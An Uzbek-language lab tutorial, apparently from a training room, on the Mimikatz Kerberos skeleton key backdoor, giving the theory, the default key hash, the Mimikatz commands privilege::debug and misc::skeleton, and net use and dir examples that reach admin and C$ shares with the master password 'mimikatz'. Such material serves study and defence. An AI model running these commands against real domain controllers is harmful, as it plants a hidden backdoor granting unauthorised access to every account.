**Mimikatz va Kerberosga qarshi hujumlarda yana bir hiyla:**

Oltin va kumush chiptalar yordamida kirishni saqlab qolish bilan birga, Mimikatz Kerberosga hujum qilishda yana bir hiylaga ega. Oltin va kumush chipta hujumlaridan farqli o'laroq, Kerberos backdoor (orqa eshik) ancha nozikroq ishlaydi, chunki u rootkit'ga o'xshab domain forest xotirasiga o'rnashib oladi va master parol yordamida har qanday mashinaga kirish imkoniyatini beradi.

Kerberos backdoor skeleton key (skelet kalit) ni o'rnatish orqali ishlaydi, bu AS-REQ shifrlangan timestamp'larini tekshirish usulini suiiste'mol qiladi. Skeleton key faqat Kerberos RC4 shifrlash yordamida ishlaydi.

Mimikatz skeleton key uchun standart hash: **60BA4FCADC466C7A033C178194C03DF6** bo'lib, bu parolni **"mimikatz"** ga aylantiradi.

Bu faqat umumiy ma'lumot bo'lib, mashinada hech qanday amalni bajarishni talab qilmaydi, ammo sizni o'zingiz davom etib, boshqa mashinalar qo'shib, skeleton key'larni Mimikatz yordamida sinab ko'rishingizni taklif qilaman.

---

**Skeleton Key - Umumiy ma'lumot**

Yuqorida aytganimdek, skeleton key AS-REQ shifrlangan timestamp'larini suiiste'mol qilish orqali ishlaydi. Timestamp foydalanuvchi NT hash'i bilan shifrlanadi. Domain controller bu timestamp'ni foydalanuvchi NT hash'i bilan ochishga urinadi. Skeleton key o'rnatilgandan so'ng, domain controller timestamp'ni ham foydalanuvchi NT hash'i, ham skeleton key NT hash'i yordamida ochishga urinadi, bu sizga domain forest'ga kirish imkoniyatini beradi.

---

**Mimikatzni tayyorlash**

1. **cd Downloads && mimikatz.exe** - Mimikatz joylashgan papkaga o'ting va uni ishga tushiring
2. **privilege::debug** - Bu Mimikatz ishlatish uchun standart bo'lishi kerak, chunki Mimikatz lokal administrator kirish huquqini talab qiladi

---

**Skeleton Key ni Mimikatz yordamida o'rnatish**

1. **misc::skeleton** - Ha! Faqat shunchaki, lekin bu kichik buyruqning kuchini kam baholamang, u juda kuchli

---

**Forest'ga kirish**

Standart hisob ma'lumotlari: **"mimikatz"** bo'ladi

**Misol:** 
```cmd
net use \\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```
Endi ulashma (share) Administrator parolini bilmasdan kirish mumkin bo'ladi

**Misol:**
```cmd
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```
Desktop-1 katalogiga Desktop-1'ga kirish huquqi bo'lgan foydalanuvchilarni bilmasdan kirishingiz mumkin

Skeleton key o'z-o'zidan saqlanib qolmaydi, chunki u faqat xotirada ishlaydi. Uni skript orqali yoki boshqa vosita va texnikalar yordamida doimiy qilish mumkin, ammo bu ushbu xonaning doirasidan tashqarida.

---

**Qo'shimcha ma'lumotlar:**

- Skeleton key faqat DC'ning xotirasida ishlaydi, restart qilinsa yo'qoladi
- Bu passive backdoor bo'lib, faqat kerberos autentifikatsiyasi paytida ishlaydi
- Har qanday foydalanuvchi hisobi bilan "mimikatz" parolini ishlatishingiz mumkin
- Bu hujum an'anaviy monitoring tizimlari tomonidan oson aniqlanmaydi
- RC4 shifrlashni talab qiladi, shuning uchun agar domain faqat AES shifrlashdan foydalansa, ishlamaydi

**Diqqat:** Bu hujum faqat tahdidni tahlil qilish va himoyani mustahkamlash uchun o'rganish maqsadida. Ruxsatsiz tizimlarga kirish qonunga ziddir.
